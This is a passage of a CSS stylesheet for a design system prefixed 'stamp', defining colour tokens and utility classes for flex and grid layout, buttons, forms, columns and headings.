linear-gradient(180deg, #6161ff4d 0%, #ffffff00 100%); --stamp-color-overflow-inline-end: linear-gradient(90deg, #ffffff00 0%, #6161ff4d 100%); --stamp-color-overflow-inline-start: linear-gradient(90deg, #6161ff4d 0%, #ffffff00 100%); --stamp-color-icon-icon-button-tertiary-pressed: #9494ff; --stamp-color-icon-icon-button-tertiary-default: #9494ff; --stamp-color-icon-icon-button-secondary-pressed: #9494ff; --stamp-color-icon-icon-button-secondary-default: #9494ff; --stamp-color-icon-icon-button-primary-pressed: #ffffffe6; --stamp-color-icon-icon-button-primary-default: #ffffffe6; --stamp-color-icon-button-tertiary-pressed: #9494ff; --stamp-color-icon-button-tertiary-default: #9494ff; --stamp-color-icon-button-secondary-pressed: #9494ff; --stamp-color-icon-button-secondary-default: #9494ff; --stamp-color-icon-button-primary-pressed: #ffffffe6; --stamp-color-icon-button-primary-default: #ffffffe6; --stamp-color-icon-accent-inverse: #1f1e2f; --stamp-color-icon-accent-default: #1f1e2f; --stamp-color-icon-disabled: #515165; --stamp-color-icon-selected: #e75204; --stamp-color-icon-pressed: #9494ff; --stamp-color-icon-hover: #9494ff; --stamp-color-icon-negative: #ee3261; --stamp-color-icon-warning: #fdd732; --stamp-color-icon-positive: #00BB53; --stamp-color-icon-informative: #009ee3; --stamp-color-icon-sustainable: #00BB53; --stamp-color-icon-on-brand: #ffffffe6; --stamp-color-icon-subtle: #86889d; --stamp-color-icon-switch-active-disabled: #515165; --stamp-color-icon-switch-active-hover: #9494ff; --stamp-color-icon-switch-active-strong: #e75204; --stamp-color-icon-switch-normal-disabled: #515165; --stamp-color-icon-switch-normal-hover: #9494ff; --stamp-color-icon-switch-normal-strong: #ffffffe6; --stamp-color-icon-strong: #ffffffe6; --stamp-color-icon-brand: #e75204; --stamp-color-icon-default: #9494ff; --stamp-color-border-button-tertiary-pressed: #ffffff00; --stamp-color-border-button-tertiary-default: #ffffff00; --stamp-color-border-button-secondary-pressed: #9494ff; --stamp-color-border-button-secondary-default: #5555d7; --stamp-color-border-button-primary-pressed: #ffffff00; --stamp-color-border-button-primary-default: #ffffff00; --stamp-color-border-fallback: #ffffff00; --stamp-color-border-focus-outline: #9494ff; --stamp-color-border-disabled: #515165; --stamp-color-border-error: #ee3261; --stamp-color-border-selected: #e75204; --stamp-color-border-pressed: #9494ff; --stamp-color-border-hover: #9494ff; --stamp-color-border-negative: #ee3261; --stamp-color-border-warning: #fdd732; --stamp-color-border-positive: #008005; --stamp-color-border-informative: #009ee3; --stamp-color-border-strong: #a2a4b4; --stamp-color-border-brand: #C73C00; --stamp-color-border-default: #515165; --stamp-color-background-badge-brand: #C73C00; --stamp-color-background-badge-important: #d70036; --stamp-color-background-badge-secondary: #2c2b40; --stamp-color-background-badge-primary: #5555d7; --stamp-color-background-app-brand: #2c2b40; --stamp-color-background-app-default: #13121C; --stamp-color-background-segment-selected: #5555d7; --stamp-color-background-segment-default: #ffffff00; --stamp-color-background-icon-button-tertiary-pressed: #ffffff00; --stamp-color-background-icon-button-tertiary-default: #ffffff00; --stamp-color-background-icon-button-secondary-pressed: #34334d; --stamp-color-background-icon-button-secondary-default: #2c2b40; --stamp-color-background-icon-button-primary-pressed: #4646a9; --stamp-color-background-icon-button-primary-default: #5555d7; --stamp-color-background-date-input-today-disabled: #515165; --stamp-color-background-date-input-today-default: #a2a4b4; --stamp-color-background-date-input-date-disabled: #2c2b40; --stamp-color-background-date-input-date-range: #ffede04d; --stamp-color-background-date-input-date-default: #1f1e2f; --stamp-color-background-data-list-selected: #ffffff00; --stamp-color-background-data-list-pressed: #2c2b40; --stamp-color-background-data-list-hover: #2c2b40; --stamp-color-background-data-list-default: #ffffff00; --stamp-color-background-card-brand-red-accent: #ab260d; --stamp-color-background-card-brand-red-default: #bf2f14; --stamp-color-background-card-brand-green-accent: #06412a; --stamp-color-background-card-brand-green-default: #085235; --stamp-color-background-card-brand-blue-accent: #4646a9; --stamp-color-background-card-brand-blue-default: #5555d7; --stamp-color-background-card-brand-dark-blue-accent: #03134d; --stamp-color-background-card-brand-dark-blue-default: #081c67; --stamp-color-background-card-brand-orange-accent: #AD3100; --stamp-color-background-card-brand-orange-default: #C73C00; --stamp-color-background-card-inverse-accent: #1f1e2f; --stamp-color-background-card-inverse-default: #1f1e2f; --stamp-color-background-card-neutral-accent: #34334d; --stamp-color-background-card-neutral-default: #2c2b40; --stamp-color-background-button-tertiary-pressed: #ffffff00; --stamp-color-background-button-tertiary-default: #ffffff00; --stamp-color-background-button-secondary-pressed: #ffffff00; --stamp-color-background-button-secondary-default: #ffffff00; --stamp-color-background-button-primary-pressed: #4646a9; --stamp-color-background-button-primary-default: #5555d7; --stamp-color-background-switch-button-active-disabled: #2c2b40; --stamp-color-background-switch-button-active-default: #1f1e2f; --stamp-color-background-switch-button-normal-disabled: #2c2b40; --stamp-color-background-switch-button-normal-default: #1f1e2f; --stamp-color-background-switch-active-disabled: #515165; --stamp-color-background-switch-active-default: #C73C00; --stamp-color-background-switch-normal-disabled: #515165; --stamp-color-background-switch-normal-default: #86889d; --stamp-color-background-disabled: #2c2b40; --stamp-color-background-negative: #ee32611a; --stamp-color-background-warning: #fdd7321a; --stamp-color-background-positive: #00bb531a; --stamp-color-background-informative: #009ee31a; --stamp-color-background-notification: #d70036; --stamp-color-background-inverse: #ffffffe6; --stamp-color-background-subtle: #424054; --stamp-color-background-strong: #86889d; --stamp-color-background-brand-subtle: #C73C00; --stamp-color-background-brand: #424054; --stamp-color-background-variant: #2c2b40; --stamp-color-background-default: #34334d; --stamp-color-background-surface: #1f1e2f; --stamp-color-text-segment-selected: #ffffffe6; --stamp-color-text-segment-default: #9494ff; --stamp-color-text-link-visited: #d05aff; --stamp-color-text-link-pressed: #9494ff; --stamp-color-text-link-hover: #9494ff; --stamp-color-text-link-on-brand: #ffffffe6; --stamp-color-text-link-subtle: #ffffffe6; --stamp-color-text-link-default: #9494ff; --stamp-color-text-icon-button-pressed: #9494ff; --stamp-color-text-icon-button-default: #9494ff; --stamp-color-text-form-control-placeholder-disabled: #515165; --stamp-color-text-form-control-placeholder-default: #ffffffe6; --stamp-color-text-form-control-value-disabled: #86889d; --stamp-color-text-form-control-value-default: #ffffffe6; --stamp-color-text-date-input-today-disabled: #ffffffe6; --stamp-color-text-date-input-today-selected: #ffffffe6; --stamp-color-text-date-input-today-default: #ffffffe6; --stamp-color-text-date-input-date-disabled: #86889d; --stamp-color-text-date-input-date-selected: #dddee3; --stamp-color-text-date-input-date-pressed: #9494ff; --stamp-color-text-date-input-date-hover: #9494ff; --stamp-color-text-date-input-date-subtle: #a2a4b4; --stamp-color-text-date-input-date-strong: #dddee3; --stamp-color-text-date-input-date-default: #9494ff; --stamp-color-text-button-tertiary-pressed: #9494ff; --stamp-color-text-button-tertiary-default: #9494ff; --stamp-color-text-button-secondary-pressed: #9494ff; --stamp-color-text-button-secondary-default: #9494ff; --stamp-color-text-button-primary-pressed: #ffffffe6; --stamp-color-text-button-primary-default: #ffffffe6; --stamp-color-text-negative: #FF5775; --stamp-color-text-positive: #00BB53; --stamp-color-text-inverse: #1f1e2f; --stamp-color-text-on-brand: #ffffffe6; --stamp-color-text-subtle: #ffffffe6; --stamp-color-text-brand: #C73C00; --stamp-color-text-default: #ffffffe6; --stamp-color-heading-on-brand: #ffffffe6; --stamp-color-heading-subtle: #ffffffe6; --stamp-color-heading-brand: #e75204; --stamp-color-heading-default: #ffffffe6; }

.stamp-provider { color: var(--stamp-color-text-default); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); font-synthesis: none; font-feature-settings: &quot;ss03&quot;, &quot;ss01&quot;; }

.stamp-flex { display: flex; }

.stamp-flex--direction-row { flex-direction: row; }

.stamp-flex--direction-column { flex-direction: column; }

.stamp-flex--wrap-wrap { flex-wrap: wrap; }

.stamp-flex--align-items-flex-start { align-items: flex-start; }

.stamp-flex--align-items-flex-end { align-items: flex-end; }

.stamp-flex--align-items-center { align-items: center; }

.stamp-flex--align-items-baseline { align-items: baseline; }

.stamp-flex--align-items-stretch { align-items: stretch; }

.stamp-flex--justify-content-flex-start { justify-content: flex-start; }

.stamp-flex--justify-content-flex-end { justify-content: flex-end; }

.stamp-flex--justify-content-center { justify-content: center; }

.stamp-flex--justify-content-space-between { justify-content: space-between; }

.stamp-flex--justify-content-space-around { justify-content: space-around; }

.stamp-flex--row-gap-mobile-xxs { row-gap: var(--stamp-spacing-inner-xxs); }

.stamp-flex--row-gap-mobile-xs { row-gap: var(--stamp-spacing-inner-xs); }

.stamp-flex--row-gap-mobile-s { row-gap: var(--stamp-spacing-inner-s); }

.stamp-flex--row-gap-mobile-m { row-gap: var(--stamp-spacing-inner-m); }

.stamp-flex--row-gap-mobile-l { row-gap: var(--stamp-spacing-inner-l); }

.stamp-flex--row-gap-mobile-xl { row-gap: var(--stamp-spacing-inner-xl); }

.stamp-flex--row-gap-mobile-xxl { row-gap: var(--stamp-spacing-inner-xxl); }

.stamp-flex--row-gap-mobile-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }

.stamp-flex--row-gap-mobile-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }

.stamp-flex--column-gap-mobile-xxs { column-gap: var(--stamp-spacing-inner-xxs); }

.stamp-flex--column-gap-mobile-xs { column-gap: var(--stamp-spacing-inner-xs); }

.stamp-flex--column-gap-mobile-s { column-gap: var(--stamp-spacing-inner-s); }

.stamp-flex--column-gap-mobile-m { column-gap: var(--stamp-spacing-inner-m); }

.stamp-flex--column-gap-mobile-l { column-gap: var(--stamp-spacing-inner-l); }

.stamp-flex--column-gap-mobile-xl { column-gap: var(--stamp-spacing-inner-xl); }

.stamp-flex--column-gap-mobile-xxl { column-gap: var(--stamp-spacing-inner-xxl); }

.stamp-flex--column-gap-mobile-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }

.stamp-flex--column-gap-mobile-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }

@media screen and (min-width: 481px) {
  .stamp-flex--row-gap-tablet-xxs { row-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-flex--row-gap-tablet-xs { row-gap: var(--stamp-spacing-inner-xs); }
  .stamp-flex--row-gap-tablet-s { row-gap: var(--stamp-spacing-inner-s); }
  .stamp-flex--row-gap-tablet-m { row-gap: var(--stamp-spacing-inner-m); }
  .stamp-flex--row-gap-tablet-l { row-gap: var(--stamp-spacing-inner-l); }
  .stamp-flex--row-gap-tablet-xl { row-gap: var(--stamp-spacing-inner-xl); }
  .stamp-flex--row-gap-tablet-xxl { row-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-flex--row-gap-tablet-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-flex--row-gap-tablet-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }
  .stamp-flex--column-gap-tablet-xxs { column-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-flex--column-gap-tablet-xs { column-gap: var(--stamp-spacing-inner-xs); }
  .stamp-flex--column-gap-tablet-s { column-gap: var(--stamp-spacing-inner-s); }
  .stamp-flex--column-gap-tablet-m { column-gap: var(--stamp-spacing-inner-m); }
  .stamp-flex--column-gap-tablet-l { column-gap: var(--stamp-spacing-inner-l); }
  .stamp-flex--column-gap-tablet-xl { column-gap: var(--stamp-spacing-inner-xl); }
  .stamp-flex--column-gap-tablet-xxl { column-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-flex--column-gap-tablet-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-flex--column-gap-tablet-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }
}

@media screen and (min-width: 768px) {
  .stamp-flex--row-gap-desktop-xxs { row-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-flex--row-gap-desktop-xs { row-gap: var(--stamp-spacing-inner-xs); }
  .stamp-flex--row-gap-desktop-s { row-gap: var(--stamp-spacing-inner-s); }
  .stamp-flex--row-gap-desktop-m { row-gap: var(--stamp-spacing-inner-m); }
  .stamp-flex--row-gap-desktop-l { row-gap: var(--stamp-spacing-inner-l); }
  .stamp-flex--row-gap-desktop-xl { row-gap: var(--stamp-spacing-inner-xl); }
  .stamp-flex--row-gap-desktop-xxl { row-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-flex--row-gap-desktop-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-flex--row-gap-desktop-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }
  .stamp-flex--column-gap-desktop-xxs { column-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-flex--column-gap-desktop-xs { column-gap: var(--stamp-spacing-inner-xs); }
  .stamp-flex--column-gap-desktop-s { column-gap: var(--stamp-spacing-inner-s); }
  .stamp-flex--column-gap-desktop-m { column-gap: var(--stamp-spacing-inner-m); }
  .stamp-flex--column-gap-desktop-l { column-gap: var(--stamp-spacing-inner-l); }
  .stamp-flex--column-gap-desktop-xl { column-gap: var(--stamp-spacing-inner-xl); }
  .stamp-flex--column-gap-desktop-xxl { column-gap: var(--stamp-spacing-inner-xl); }
  .stamp-flex--column-gap-desktop-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-flex--column-gap-desktop-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }
}

.stamp-button, a.stamp-button { position: relative; display: inline-block; max-inline-size: 100%; cursor: pointer; padding-block: var(--stamp-spacing-inner-s); padding-inline: var(--stamp-spacing-inner-xl); border-style: solid; border-width: var(--stamp-border-width-s); font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); line-height: var(--stamp-text-cta-default-line-height); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); text-decoration: none; }

.stamp-button:hover { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); }

.stamp-button:active { font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); }

.stamp-button--size-auto { inline-size: auto; }

.stamp-button--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-button--size-full, a.stamp-button--size-full { inline-size: auto; }
}

.stamp-button--variant-primary:focus, .stamp-button--variant-secondary:focus, .stamp-button--variant-tertiary:focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-button--variant-primary:focus, .stamp-button--variant-secondary:focus, .stamp-button--variant-tertiary:focus { outline: none; }
  .stamp-button--variant-primary:focus-visible, .stamp-button--variant-secondary:focus-visible, .stamp-button--variant-tertiary:focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-button--variant-primary, a.stamp-button--variant-primary { background-color: var(--stamp-color-background-button-primary-default); border-color: var(--stamp-color-border-button-primary-default); border-radius: var(--stamp-radius-xs); }

.stamp-button--variant-primary, a.stamp-button--variant-primary, .stamp-button--variant-primary:hover, a.stamp-button--variant-primary:hover { color: var(--stamp-color-text-button-primary-default); }

.stamp-button--variant-primary:active, a.stamp-button--variant-primary:active { background-color: var(--stamp-color-background-button-primary-pressed); color: var(--stamp-color-text-button-primary-pressed); border-color: var(--stamp-color-border-button-primary-pressed); }

.stamp-button--variant-secondary, a.stamp-button--variant-secondary { background-color: var(--stamp-color-background-button-secondary-default); border-color: var(--stamp-color-border-button-secondary-default); border-radius: var(--stamp-radius-xs); border-style: solid; }

.stamp-button--variant-secondary, a.stamp-button--variant-secondary, .stamp-button--variant-secondary:hover, a.stamp-button--variant-secondary:hover { color: var(--stamp-color-text-button-secondary-default); }

.stamp-button--variant-secondary:active, a.stamp-button--variant-secondary:active { background-color: var(--stamp-color-background-button-secondary-pressed); border-color: var(--stamp-color-border-button-secondary-pressed); color: var(--stamp-color-text-button-secondary-pressed); }

.stamp-button--variant-tertiary, a.stamp-button--variant-tertiary { background-color: var(--stamp-color-background-button-tertiary-default); border-color: var(--stamp-color-border-button-tertiary-default); border-radius: var(--stamp-radius-xs); }

.stamp-button--variant-tertiary, a.stamp-button--variant-tertiary, .stamp-button--variant-tertiary:hover, a.stamp-button--variant-tertiary:hover { color: var(--stamp-color-text-button-tertiary-default); }

.stamp-button--variant-tertiary:active, a.stamp-button--variant-tertiary:active { background-color: var(--stamp-color-background-button-tertiary-pressed); border-color: var(--stamp-color-border-button-tertiary-pressed); color: var(--stamp-color-text-button-tertiary-pressed); }

.stamp-button__icon { display: flex; justify-content: center; align-items: center; max-inline-size: var(--stamp-size-icon-s); max-block-size: var(--stamp-size-icon-s); }

.stamp-button--variant-primary .stamp-button__icon, .stamp-button--variant-primary .stamp-button__spinner { color: var(--stamp-color-icon-button-primary-default); }

.stamp-button--variant-primary:active .stamp-button__icon { color: var(--stamp-color-icon-button-primary-pressed); }

.stamp-button--variant-secondary .stamp-button__icon, .stamp-button--variant-secondary .stamp-button__spinner { color: var(--stamp-color-icon-button-secondary-default); }

.stamp-button--variant-secondary:active .stamp-button__icon { color: var(--stamp-color-icon-button-secondary-pressed); }

.stamp-button--variant-tertiary .stamp-button__icon, .stamp-button--variant-tertiary .stamp-button__spinner { color: var(--stamp-color-icon-button-tertiary-default); }

.stamp-button--variant-tertiary:active .stamp-button__icon { color: var(--stamp-color-icon-button-tertiary-pressed); }

.stamp-button__content { display: inline-flex; vertical-align: middle; gap: var(--stamp-spacing-inner-s); align-items: center; justify-content: center; max-inline-size: 100%; inline-size: 100%; text-decoration: inherit; }

.stamp-button--loading .stamp-button__content { visibility: hidden; }

.stamp-button__overlay { position: absolute; inset: 0px; inline-size: 100%; block-size: 100%; z-index: 1; display: flex; align-items: center; justify-content: center; }

.stamp-form { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-xl); }

.stamp-column--span-mobile-1 { grid-column-end: span 1; }

.stamp-column--span-mobile-2 { grid-column-end: span 2; }

.stamp-column--span-mobile-3 { grid-column-end: span 3; }

.stamp-column--span-mobile-4 { grid-column-end: span 4; }

.stamp-column--span-mobile-5 { grid-column-end: span 5; }

.stamp-column--span-mobile-6 { grid-column-end: span 6; }

.stamp-column--span-mobile-7 { grid-column-end: span 7; }

.stamp-column--span-mobile-8 { grid-column-end: span 8; }

.stamp-column--span-mobile-9 { grid-column-end: span 9; }

.stamp-column--span-mobile-10 { grid-column-end: span 10; }

.stamp-column--span-mobile-11 { grid-column-end: span 11; }

.stamp-column--span-mobile-12 { grid-column-end: span 12; }

@media screen and (min-width: 481px) {
  .stamp-column--span-tablet-1 { grid-column-end: span 1; }
  .stamp-column--span-tablet-2 { grid-column-end: span 2; }
  .stamp-column--span-tablet-3 { grid-column-end: span 3; }
  .stamp-column--span-tablet-4 { grid-column-end: span 4; }
  .stamp-column--span-tablet-5 { grid-column-end: span 5; }
  .stamp-column--span-tablet-6 { grid-column-end: span 6; }
  .stamp-column--span-tablet-7 { grid-column-end: span 7; }
  .stamp-column--span-tablet-8 { grid-column-end: span 8; }
  .stamp-column--span-tablet-9 { grid-column-end: span 9; }
  .stamp-column--span-tablet-10 { grid-column-end: span 10; }
  .stamp-column--span-tablet-11 { grid-column-end: span 11; }
  .stamp-column--span-tablet-12 { grid-column-end: span 12; }
}

@media screen and (min-width: 768px) {
  .stamp-column--span-desktop-1 { grid-column-end: span 1; }
  .stamp-column--span-desktop-2 { grid-column-end: span 2; }
  .stamp-column--span-desktop-3 { grid-column-end: span 3; }
  .stamp-column--span-desktop-4 { grid-column-end: span 4; }
  .stamp-column--span-desktop-5 { grid-column-end: span 5; }
  .stamp-column--span-desktop-6 { grid-column-end: span 6; }
  .stamp-column--span-desktop-7 { grid-column-end: span 7; }
  .stamp-column--span-desktop-8 { grid-column-end: span 8; }
  .stamp-column--span-desktop-9 { grid-column-end: span 9; }
  .stamp-column--span-desktop-10 { grid-column-end: span 10; }
  .stamp-column--span-desktop-11 { grid-column-end: span 11; }
  .stamp-column--span-desktop-12 { grid-column-end: span 12; }
}

.stamp-column--start-mobile-1 { grid-column-start: 1; }

.stamp-column--start-mobile-2 { grid-column-start: 2; }

.stamp-column--start-mobile-3 { grid-column-start: 3; }

.stamp-column--start-mobile-4 { grid-column-start: 4; }

.stamp-column--start-mobile-5 { grid-column-start: 5; }

.stamp-column--start-mobile-6 { grid-column-start: 6; }

.stamp-column--start-mobile-7 { grid-column-start: 7; }

.stamp-column--start-mobile-8 { grid-column-start: 8; }

.stamp-column--start-mobile-9 { grid-column-start: 9; }

.stamp-column--start-mobile-10 { grid-column-start: 10; }

.stamp-column--start-mobile-11 { grid-column-start: 11; }

.stamp-column--start-mobile-12 { grid-column-start: 12; }

@media screen and (min-width: 481px) {
  .stamp-column--start-tablet-1 { grid-column-start: 1; }
  .stamp-column--start-tablet-2 { grid-column-start: 2; }
  .stamp-column--start-tablet-3 { grid-column-start: 3; }
  .stamp-column--start-tablet-4 { grid-column-start: 4; }
  .stamp-column--start-tablet-5 { grid-column-start: 5; }
  .stamp-column--start-tablet-6 { grid-column-start: 6; }
  .stamp-column--start-tablet-7 { grid-column-start: 7; }
  .stamp-column--start-tablet-8 { grid-column-start: 8; }
  .stamp-column--start-tablet-9 { grid-column-start: 9; }
  .stamp-column--start-tablet-10 { grid-column-start: 10; }
  .stamp-column--start-tablet-11 { grid-column-start: 11; }
  .stamp-column--start-tablet-12 { grid-column-start: 12; }
}

@media screen and (min-width: 768px) {
  .stamp-column--start-desktop-1 { grid-column-start: 1; }
  .stamp-column--start-desktop-2 { grid-column-start: 2; }
  .stamp-column--start-desktop-3 { grid-column-start: 3; }
  .stamp-column--start-desktop-4 { grid-column-start: 4; }
  .stamp-column--start-desktop-5 { grid-column-start: 5; }
  .stamp-column--start-desktop-6 { grid-column-start: 6; }
  .stamp-column--start-desktop-7 { grid-column-start: 7; }
  .stamp-column--start-desktop-8 { grid-column-start: 8; }
  .stamp-column--start-desktop-9 { grid-column-start: 9; }
  .stamp-column--start-desktop-10 { grid-column-start: 10; }
  .stamp-column--start-desktop-11 { grid-column-start: 11; }
  .stamp-column--start-desktop-12 { grid-column-start: 12; }
}

.stamp-grid { display: grid; grid-template-columns: repeat(12, 1fr); inline-size: 100%; }

.stamp-grid--row-gap-mobile-xxs { row-gap: var(--stamp-spacing-inner-xxs); }

.stamp-grid--row-gap-mobile-xs { row-gap: var(--stamp-spacing-inner-xs); }

.stamp-grid--row-gap-mobile-s { row-gap: var(--stamp-spacing-inner-s); }

.stamp-grid--row-gap-mobile-m { row-gap: var(--stamp-spacing-inner-m); }

.stamp-grid--row-gap-mobile-l { row-gap: var(--stamp-spacing-inner-l); }

.stamp-grid--row-gap-mobile-xl { row-gap: var(--stamp-spacing-inner-xl); }

.stamp-grid--row-gap-mobile-xxl { row-gap: var(--stamp-spacing-inner-xxl); }

.stamp-grid--row-gap-mobile-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }

.stamp-grid--row-gap-mobile-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }

.stamp-grid--column-gap-mobile-xxs { column-gap: var(--stamp-spacing-inner-xxs); }

.stamp-grid--column-gap-mobile-xs { column-gap: var(--stamp-spacing-inner-xs); }

.stamp-grid--column-gap-mobile-s { column-gap: var(--stamp-spacing-inner-s); }

.stamp-grid--column-gap-mobile-m { column-gap: var(--stamp-spacing-inner-m); }

.stamp-grid--column-gap-mobile-l { column-gap: var(--stamp-spacing-inner-l); }

.stamp-grid--column-gap-mobile-xl { column-gap: var(--stamp-spacing-inner-xl); }

.stamp-grid--column-gap-mobile-xxl { column-gap: var(--stamp-spacing-inner-xxl); }

.stamp-grid--column-gap-mobile-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }

.stamp-grid--column-gap-mobile-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }

@media screen and (min-width: 481px) {
  .stamp-grid--row-gap-tablet-xxs { row-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-grid--row-gap-tablet-xs { row-gap: var(--stamp-spacing-inner-xs); }
  .stamp-grid--row-gap-tablet-s { row-gap: var(--stamp-spacing-inner-s); }
  .stamp-grid--row-gap-tablet-m { row-gap: var(--stamp-spacing-inner-m); }
  .stamp-grid--row-gap-tablet-l { row-gap: var(--stamp-spacing-inner-l); }
  .stamp-grid--row-gap-tablet-xl { row-gap: var(--stamp-spacing-inner-xl); }
  .stamp-grid--row-gap-tablet-xxl { row-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-grid--row-gap-tablet-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-grid--row-gap-tablet-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }
  .stamp-grid--column-gap-tablet-xxs { column-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-grid--column-gap-tablet-xs { column-gap: var(--stamp-spacing-inner-xs); }
  .stamp-grid--column-gap-tablet-s { column-gap: var(--stamp-spacing-inner-s); }
  .stamp-grid--column-gap-tablet-m { column-gap: var(--stamp-spacing-inner-m); }
  .stamp-grid--column-gap-tablet-l { column-gap: var(--stamp-spacing-inner-l); }
  .stamp-grid--column-gap-tablet-xl { column-gap: var(--stamp-spacing-inner-xl); }
  .stamp-grid--column-gap-tablet-xxl { column-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-grid--column-gap-tablet-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-grid--column-gap-tablet-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }
}

@media screen and (min-width: 768px) {
  .stamp-grid--row-gap-desktop-xxs { row-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-grid--row-gap-desktop-xs { row-gap: var(--stamp-spacing-inner-xs); }
  .stamp-grid--row-gap-desktop-s { row-gap: var(--stamp-spacing-inner-s); }
  .stamp-grid--row-gap-desktop-m { row-gap: var(--stamp-spacing-inner-m); }
  .stamp-grid--row-gap-desktop-l { row-gap: var(--stamp-spacing-inner-l); }
  .stamp-grid--row-gap-desktop-xl { row-gap: var(--stamp-spacing-inner-xl); }
  .stamp-grid--row-gap-desktop-xxl { row-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-grid--row-gap-desktop-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-grid--row-gap-desktop-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }
  .stamp-grid--column-gap-desktop-xxs { column-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-grid--column-gap-desktop-xs { column-gap: var(--stamp-spacing-inner-xs); }
  .stamp-grid--column-gap-desktop-s { column-gap: var(--stamp-spacing-inner-s); }
  .stamp-grid--column-gap-desktop-m { column-gap: var(--stamp-spacing-inner-m); }
  .stamp-grid--column-gap-desktop-l { column-gap: var(--stamp-spacing-inner-l); }
  .stamp-grid--column-gap-desktop-xl { column-gap: var(--stamp-spacing-inner-xl); }
  .stamp-grid--column-gap-desktop-xxl { column-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-grid--column-gap-desktop-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-grid--column-gap-desktop-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }
}

.stamp-heading { font-feature-settings: normal; }

.stamp-heading--size-xxs { letter-spacing: var(--stamp-text-heading-xxs-letter-spacing); line-height: var(--stamp-text-heading-xxs-line-height); font-weight: var(--stamp-text-heading-xxs-font-weight); font-family: var(--stamp-text-heading-xxs-font-family); font-size: var(--stamp-text-heading-xxs-font-size); }

.stamp-heading--size-xs { letter-spacing: var(--stamp-text-heading-xs-letter-spacing); line-height: var(--stamp-text-heading-xs-line-height); font-weight: var(--stamp-text-heading-xs-font-weight); font-family: var(--stamp-text-heading-xs-font-family); font-size: var(--stamp-text-heading-xs-font-size); }

.stamp-heading--size-s { letter-spacing: var(--stamp-text-heading-s-letter-spacing); line-height: var(--stamp-text-heading-s-line-height); font-weight: var(--stamp-text-heading-s-font-weight); font-family: var(--stamp-text-heading-s-font-family); font-size: var(--stamp-text-heading-xs-font-size); }

.stamp-heading--size-m { letter-spacing: var(--stamp-text-heading-m-letter-spacing); line-height: var(--stamp-text-heading-m-line-height); font-weight: var(--stamp-text-heading-m-font-weight); font-family: var(--stamp-text-heading-m-font-family); font-size: var(--stamp-text-heading-s-font-size); }

.stamp-heading--size-l { letter-spacing: var(--stamp-text-heading-l-letter-spacing); line-height: var(--stamp-text-heading-l-line-height); font-weight: var(--stamp-text-heading-l-font-weight); font-family: var(--stamp-text-heading-l-font-family); font-size: var(--stamp-text-heading-m-font-size); }

.stamp-heading--size-xl { letter-spacing: var(--stamp-text-heading-xl-letter-spacing); line-height: var(--stamp-text-heading-xl-line-height); font-weight: var(--stamp-text-heading-xl-font-weight); font-family: var(--stamp-text-heading-xl-font-family); font-size: var(--stamp-text-heading-l-font-size); }

.stamp-heading--size-xxl { letter-spacing: var(--stamp-text-heading-xxl-letter-spacing); line-height: var(--stamp-text-heading-xxl-line-height); font-weight: var(--stamp-text-heading-xxl-font-weight); font-family: var(--stamp-text-heading-xxl-font-family); font-size: var(--stamp-text-heading-xl-font-size); }

